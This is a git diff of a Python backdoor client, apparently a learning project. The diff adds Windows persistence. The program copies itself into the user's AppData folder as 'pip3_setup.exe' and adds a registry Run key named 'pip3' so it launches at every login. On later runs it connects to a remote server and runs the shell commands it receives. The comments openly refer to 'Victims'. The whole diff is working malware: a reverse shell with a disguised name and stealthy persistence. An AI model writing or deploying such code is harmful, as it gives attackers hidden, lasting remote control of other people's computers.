@@ -1,9 +1,14 @@
 ##!/usr/bin/python
 import socket
 import subprocess
+# To allow sanctioning of json => bytes data
 import json
 # To allow pausing of our program
 import time
+# To allow manipulation of Registry keys
+import os
+import shutil
+import sys
 
 # Global variables
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -82,15 +87,34 @@ def shell():
                 error_message = f'[!!] Cannot Execute this command: {str(e)}'
                 reliable_send(error_message)
 
-sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-# ==========================================
-# IP_ADDRESS = '192.168.31.138'
-# port = 54321
-#sock.connect((IP_ADDRESS, port))
-#print(f'Connection Established to Server!')
-#shell()
-# ==========================================
-connection()
-#answer = "Server: Hello Back!"
-#sock.send(answer.encode())
-sock.close()
+# We'd like to manipulate the Registry keys first
+# C:\Users\USER\AppData\Roaming is hidden
+# We'll target this directory for our Reverse Shell
+# This will point to whoever user's /AppData
+location = os.environ["appdata"] + "\\pip3_setup.exe"
+
+# If 'location' does NOT exist, it's 1st time running this Backdoor client
+if not os.path.exists(location):
+    # Performing copying action of our Backdoor.exe to User's /AppData
+    shutil.copyfile(sys.executable, location)
+    # Allow users to proactively connect to our backdoor server
+    # whenever they login to their machines
+    #
+    # Appending machine startup .exe permissions to Victims' Windows regkey at
+    # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+    # /v = Name; /t = Type; /d = Data
+    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v pip3 /t REG_SZ /d "' + location + '"', shell=True)
+else:
+    # Otherwise, just jump to steps below
+    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    # ==========================================
+    # IP_ADDRESS = '192.168.31.138'
+    # port = 54321
+    #sock.connect((IP_ADDRESS, port))
+    #print(f'Connection Established to Server!')
+    #shell()
+    # ==========================================
+    connection()
+    #answer = "Server: Hello Back!"
+    #sock.send(answer.encode())
+    sock.close()
